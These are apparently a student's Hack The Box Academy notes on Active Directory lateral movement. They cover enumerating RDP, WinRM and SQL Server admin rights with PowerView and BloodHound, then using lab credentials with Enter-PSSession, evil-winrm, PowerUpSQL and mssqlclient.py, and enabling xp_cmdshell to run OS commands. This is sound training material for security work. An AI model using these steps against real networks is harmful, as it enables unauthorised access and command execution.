## Lateral Domain Movement Without Local Admin
- RDP
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - aka PSRemoting or WinRM
- MSSQL Server - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods

The easiest way to enumerate this access is via Bloodhound. The following edges exist to show us what types of remote privs a user has:
- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

We can also enumerate this with PowerView or built-in tools.
___

##  Remote Desktop

#### Enumerate Remote Desktop Users Group (PowerView)
``` powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
![[2023-04-24 16_31_21-Hack The Box - Academy.png|400]]
- The info above shows that all Domain Users (meaning all users in the domain) can RDP to this host.

#### Check the Domain Users Group's Local Admin & Execution Rights using BloodHound
- One of the first things to check after importing Bloodhound is:
	- Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?
![[Pasted image 20230424163413.png|700]]

#### Check Remote Access Rights using BloodHound
- If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.
![[Pasted image 20230424163445.png|700]]

- We can also check the `Analysis` tab and run
	- `Find Workstations where Domain Users can RDP`
	- `Find Servers where Domain Users can RDP`
___

## WinRM

#### Enumerate the Remote Management Users Group (PowerView)
``` powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

#### Use the Cypher Query in BloodHound
- We can use the following custom Cypher Query in Bloodhound to look for users with this type of access.
	- Paste the query into the `Raw Query` box at the bottom of the screen and hit enter
``` cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

- We can also add this as a custom query to our Bloodhound install, so its readily available.

#### Establish WinRM Session from Windows
``` powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force

PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

```

#### Use evil-winrm
``` bash
gem install evil-winrm

evil-winrm -i 10.129.201.234 -u forend
```
___

## SQL Server Admin
- It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance.
	- We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying.
	- Another way that you may find SQL server credentials is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.

#### Use a Custom Cypher Query to Check for SQL Admin Rights in BloodHound
``` cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
![[Pasted image 20230424164558.png|700]]

- We can use our ACL rights to authenticate with the `wley` user
	- change the password for the `damundsen` user
		- hen authenticate with the target using a tool such as `PowerUpSQL`, which has a handy [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet).

#### Enumerate MSSQL Instances with PowerUpSQL (Windows)
``` powershell
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain
```
- We could then authenticate against the remote SQL server and run custom queries or OS commands.
``` powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

#### Run mssqlclient.py Against the Target (Linux)
``` bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

#### Enable_xp_cmdshell
``` SQL
enable_xp_cmdshell

xp_cmdshell whoami /priv
```